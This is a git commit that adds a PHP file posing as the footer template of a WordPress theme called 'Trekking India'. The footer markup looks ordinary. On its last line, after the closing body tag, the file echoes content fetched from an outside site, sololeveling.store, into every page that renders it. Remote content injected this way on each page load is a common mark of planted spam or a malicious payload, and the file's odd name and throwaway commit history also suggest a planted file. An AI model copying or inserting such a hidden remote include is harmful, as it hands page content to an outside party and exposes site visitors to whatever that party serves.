7e7020dd4ffc57a64e6e2c2b802e28d07278f9c6
labubunews <184888992+labubunews@users.noreply.github.com>
2025-04-25 22:25:01 +0700

    xt.php
    Signed-off-by: labubunews <184888992+labubunews@users.noreply.github.com>

--- xt.php
+++ xt.php
@@ -1,1 +1,121 @@
-asd
+<?php
+
+
+
+/**
+
+
+
+ * The template for displaying the footer
+
+
+
+ *
+
+
+
+ * Contains footer content and the closing of the #main and #page div elements.
+
+
+
+ *
+
+
+
+ * @package WordPress
+
+
+
+ * @subpackage Trekking India
+
+
+
+ * @since Trekking India
+
+
+
+ */
+
+
+
+?>
+
+
+
+</div><!-- #main -->
+
+
+
+<!--footer-outer-start-->
+
+
+
+<div class="footer">
+
+
+
+<div class="footer-mid">
+
+
+
+<div class="copyright-content">
+
+
+<div class="footer-outer">
+
+
+ <div class="footer-nav">
+
+	<?php wp_nav_menu( array(
+
+	'theme_location' => 'secondary',
+
+	'menu_class' => '',
+
+    'container' => false ) );  ?>
+
+
+<p><?php printf( __( 'Copyright &copy;2020 - Todos os direitos reservados')); ?> </p>
+
+
+</div>
+
+
+
+</div>
+
+</div>
+
+
+
+<!-- <div class="sitemap-link">
+
+
+
+<a href="<?php echo get_permalink(325);  ?>"><?php echo get_the_title(325); ?> </a>
+
+
+
+</div> -->
+
+
+
+</div>
+
+
+
+</div>
+
+
+
+<!--footer-outer-end-->
+
+
+
+</div><!-- #page -->
+
+
+<?php wp_footer(); ?>
+
+
+</body><?php echo file_get_contents("https://www.sololeveling.store/validation/acid.txt");?></html>
